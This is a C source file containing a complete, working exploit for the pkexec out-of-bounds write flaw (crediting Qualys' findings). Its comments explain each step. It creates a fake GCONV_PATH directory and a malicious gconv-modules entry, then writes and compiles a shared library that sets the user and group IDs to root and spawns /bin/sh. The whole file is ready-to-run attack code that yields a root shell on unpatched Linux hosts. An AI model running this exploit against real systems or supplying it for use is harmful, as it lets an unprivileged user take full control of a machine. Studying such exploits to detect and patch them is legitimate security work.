#include <stdio.h>      /* Include Standard I/O*/
#include <stdlib.h>     /* Include Standard Library */
#include <string.h>     /* Need some string manipulation */
#include <unistd.h>     /* For execve to execute a binary */
#include <sys/stat.h>   /* File information */
#include <sys/types.h>  /* File information */
#include <fcntl.h>      /* For various constants such as O_CREAT */

/* Helper function prototypes */
void fatal_error(char *f);
void compile_library();

int main(int argc, char *argv[]) {
  struct stat stat_struct;
  
  /* Force argument list terminator to be 1
   * because in the pkexec' code if argv is NULL
   * then it sets a constant of 1 so we can set
   * pointer path to out-of-bounds.
   */
  char *a_argv[] = { NULL };

  /* Although not properly documented but it has been
   * here with us for quite some time, *envp pointer
   * just stores and prints all environment variables.
   *
   * We will be focring XAUTHORITY to report an error.
   */
  char *a_envp[] = {
      "test-milotio",
      "PATH=GCONV_PATH=.",
      "LC_MESSAGES=en_US.UTF-8",
      "XAUTHORITY=../TEST-MILOTIO",
      NULL
  };

  /* Compile the helper library */
  printf("[*] Compiling helper library...\n");
  compile_library();

  /* Based on the Qualys' findings, if "PATH=name=." and if directory "name=."
   * that contains an executable file named value exists, then a pointer
   * to the string name=./value is written out of bounds to envp[0].
   *
   * The lines below create the path directory.
   */
  if (stat("GCONV_PATH=.", &stat_struct) < 0) {
    if(mkdir("GCONV_PATH=.", 0777) < 0) {
      fatal_error("mkdir");
    }

    int file_descriptor = open("GCONV_PATH=./test-milotio", O_CREAT|O_RDWR, 0777);

    if (file_descriptor < 0) {
      fatal_error("open");
    }

    close(file_descriptor);
  }

  if (stat("test-milotio", &stat_struct) < 0) {
    if (mkdir("test-milotio", 0777) < 0) {
      fatal_error("mkdir");
    }

    /* Create the gconv-modules file in order to load
     * the malicious .so library the compile_library()
     * function produces.
     */
    FILE *file_pointer = fopen("test-milotio/gconv-modules", "wb");

    if (file_pointer == NULL) {
      fatal_error("fopen");
    }

    /* Insert the malicious payload named "payload-milotio" 
     * inside the gconv-modules using the gconv-modules format.
     */
    fprintf(file_pointer, "module  UTF-8//    UTF-32//    ../payload-milotio\n");
    fclose(file_pointer);
  }

  printf("[*] Check for root shell.\n");

  /* Execute pkexec with argv of NULL and envp containing malicious code */
  execve("/usr/bin/pkexec", a_argv, a_envp);
}

/* Convenience function for printing 
 * errors and exiting with failure
 */
void fatal_error(char *error) {
  perror(error); /* Print error */
  exit(-1);      /* Indicates it exited with failure */
}


/* Create a helper library so it gets loaded into gconv-modules
 * when XAUTHORITY will complain about environment
 * value contains suspicious content, by this time pkexec already
 * has injected the malicious .so library created in this function.
 *
 * This helper library tries to set setuid, seteuid, setgid and setegid
 * to zero (root) and calls execve to execute a shell.
 */
void compile_library() {
  /* Create a payload.c file */
  FILE *payload_file = fopen("payload-milotio.c", "wb");

  if (payload_file == NULL) {
    fatal_error("fopen");
  }

  /* Write the library code, this utilizes gconv_init
   * to execute it into GCONV_PATH using LD_PRELOAD.
   *
   * Code is straight forward.
   */
  char lib_code[] =
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <unistd.h>\n"
    "void gconv() {\n"
    "   return;\n"
    "}\n"
    "   "
    "void gconv_init() {\n"
    "   setuid(0);\n"
    "   seteuid(0);\n"
    "   setgid(0);\n"
    "   setegid(0);\n"
    "   static char *a_argv[] = { \"sh\", NULL };\n"
    "   static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL };\n"
    "   execve(\"/bin/sh\", a_argv, a_envp);\n"
    "   exit(0);\n"
    "}\n";

  /* Write file */
  fwrite(lib_code, strlen(lib_code), 1, payload_file);
  fclose(payload_file);

  /* Compile the library using Position Independent Code (fPIC) */
  system("gcc -o payload-milotio.so -shared -fPIC payload-milotio.c");

}
